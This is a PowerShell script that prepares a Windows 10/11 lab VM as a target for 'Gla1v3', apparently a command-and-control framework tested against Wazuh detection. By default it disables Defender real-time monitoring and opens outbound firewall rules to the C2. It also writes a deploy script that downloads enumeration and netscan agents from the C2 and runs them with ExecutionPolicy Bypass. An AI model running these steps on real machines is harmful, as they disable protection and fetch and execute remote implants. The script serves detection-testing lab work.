# Gla1v3 Windows Target VM Setup Script
# This script prepares a Windows 10/11 VM for agent deployment and testing

#Requires -RunAsAdministrator

param(
    [string]$C2Server = "192.168.1.100",  # Change to your C2 server IP
    [switch]$InstallDefender = $false,
    [switch]$EnableAuditLogging = $true
)

Write-Host "=== Gla1v3 Windows Target VM Setup ===" -ForegroundColor Cyan
Write-Host ""

# 1. Configure network and DNS
Write-Host "[*] Configuring network and hosts file..." -ForegroundColor Yellow
$hostsFile = "C:\Windows\System32\drivers\etc\hosts"
$hostsEntries = @"

# Gla1v3 C2 Infrastructure
$C2Server c2.gla1v3.local
$C2Server api.gla1v3.local
$C2Server dashboard.gla1v3.local
$C2Server wazuh.gla1v3.local
"@

Add-Content -Path $hostsFile -Value $hostsEntries
Write-Host "[+] Hosts file configured" -ForegroundColor Green

# 2. Install prerequisites
Write-Host "[*] Installing prerequisites..." -ForegroundColor Yellow

# Enable .NET Framework 3.5 (if needed)
$netFeature = Get-WindowsOptionalFeature -Online -FeatureName NetFx3
if ($netFeature.State -ne "Enabled") {
    Enable-WindowsOptionalFeature -Online -FeatureName NetFx3 -NoRestart
}

# Install PowerShell 7 (optional, for better scripting)
if (!(Get-Command pwsh -ErrorAction SilentlyContinue)) {
    Write-Host "[*] Installing PowerShell 7..." -ForegroundColor Yellow
    winget install --id Microsoft.PowerShell --silent --accept-source-agreements --accept-package-agreements
}

Write-Host "[+] Prerequisites installed" -ForegroundColor Green

# 3. Configure Windows Defender (if requested)
if ($InstallDefender) {
    Write-Host "[*] Configuring Windows Defender..." -ForegroundColor Yellow
    Set-MpPreference -DisableRealtimeMonitoring $false
    Set-MpPreference -MAPSReporting Advanced
    Set-MpPreference -SubmitSamplesConsent SendAllSamples
    Update-MpSignature
    Write-Host "[+] Windows Defender enabled and updated" -ForegroundColor Green
} else {
    Write-Host "[*] Disabling Windows Defender for testing..." -ForegroundColor Yellow
    Set-MpPreference -DisableRealtimeMonitoring $true
    Write-Host "[+] Windows Defender disabled" -ForegroundColor Green
}

# 4. Enable audit logging for better detection
if ($EnableAuditLogging) {
    Write-Host "[*] Enabling advanced audit logging..." -ForegroundColor Yellow
    
    # Enable process creation auditing
    auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable
    
    # Enable registry auditing
    auditpol /set /subcategory:"Registry" /success:enable /failure:enable
    
    # Enable file system auditing
    auditpol /set /subcategory:"File System" /success:enable /failure:enable
    
    # Enable network auditing
    auditpol /set /subcategory:"Filtering Platform Connection" /success:enable /failure:enable
    
    # Enable PowerShell logging
    $psLoggingPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
    if (!(Test-Path $psLoggingPath)) {
        New-Item -Path $psLoggingPath -Force | Out-Null
    }
    Set-ItemProperty -Path $psLoggingPath -Name "EnableScriptBlockLogging" -Value 1
    
    Write-Host "[+] Audit logging enabled" -ForegroundColor Green
}

# 5. Configure firewall
Write-Host "[*] Configuring firewall..." -ForegroundColor Yellow

# Allow outbound HTTPS to C2
New-NetFirewallRule -DisplayName "Gla1v3 C2 - HTTPS" `
    -Direction Outbound `
    -Action Allow `
    -Protocol TCP `
    -RemotePort 443,4443 `
    -RemoteAddress $C2Server `
    -ErrorAction SilentlyContinue

# Allow inbound RDP (for management)
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

Write-Host "[+] Firewall configured" -ForegroundColor Green

# 6. Create agent directory
Write-Host "[*] Creating agent directory..." -ForegroundColor Yellow
$agentDir = "C:\Gla1v3\agents"
New-Item -ItemType Directory -Path $agentDir -Force | Out-Null
Write-Host "[+] Agent directory created: $agentDir" -ForegroundColor Green

# 7. Create deployment info file
$deployInfo = @{
    Hostname = $env:COMPUTERNAME
    OSVersion = (Get-CimInstance Win32_OperatingSystem).Caption
    SetupDate = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    C2Server = $C2Server
    AgentDirectory = $agentDir
    DefenderEnabled = $InstallDefender
    AuditLoggingEnabled = $EnableAuditLogging
} | ConvertTo-Json

Set-Content -Path "$agentDir\deployment-info.json" -Value $deployInfo

# 8. Create quick deployment script
$deployScript = @'
# Quick Agent Deployment Script
param([string]$AgentType = "main")

$c2Server = "https://api.gla1v3.local"
$agentDir = "C:\Gla1v3\agents"

Write-Host "Downloading $AgentType agent from C2..."

$agentMap = @{
    "main" = "agent.exe"
    "fileenum" = "agent-fileenum.exe"
    "regenum" = "agent-regenum.exe"
    "sysinfo" = "agent-sysinfo.exe"
    "netscan" = "agent-netscan.exe"
}

$agentFile = $agentMap[$AgentType]
if (!$agentFile) {
    Write-Error "Unknown agent type: $AgentType"
    exit 1
}

try {
    $downloadUrl = "$c2Server/download/$agentFile"
    $outputPath = Join-Path $agentDir $agentFile
    
    Invoke-WebRequest -Uri $downloadUrl -OutFile $outputPath -UseBasicParsing
    Write-Host "Agent downloaded to: $outputPath"
    
    Write-Host "Starting agent..."
    Start-Process -FilePath $outputPath -WorkingDirectory $agentDir
    
    Write-Host "Agent started successfully!"
} catch {
    Write-Error "Failed to deploy agent: $_"
}
'@

Set-Content -Path "$agentDir\deploy-agent.ps1" -Value $deployScript

Write-Host ""
Write-Host "=== Setup Complete ===" -ForegroundColor Green
Write-Host ""
Write-Host "VM Information:" -ForegroundColor Cyan
Write-Host "  Hostname: $env:COMPUTERNAME"
Write-Host "  C2 Server: $C2Server"
Write-Host "  Agent Directory: $agentDir"
Write-Host "  Defender: $(if($InstallDefender){'Enabled'}else{'Disabled'})"
Write-Host "  Audit Logging: $(if($EnableAuditLogging){'Enabled'}else{'Disabled'})"
Write-Host ""
Write-Host "Next Steps:" -ForegroundColor Yellow
Write-Host "  1. Take a VM snapshot (clean state)"
Write-Host "  2. Deploy agents from dashboard or run: $agentDir\deploy-agent.ps1"
Write-Host "  3. Monitor detections in Wazuh dashboard"
Write-Host "  4. Restore snapshot between tests"
Write-Host ""
Write-Host "Quick Deploy Command:" -ForegroundColor Cyan
Write-Host "  PowerShell -ExecutionPolicy Bypass -File $agentDir\deploy-agent.ps1 -AgentType main"
Write-Host ""
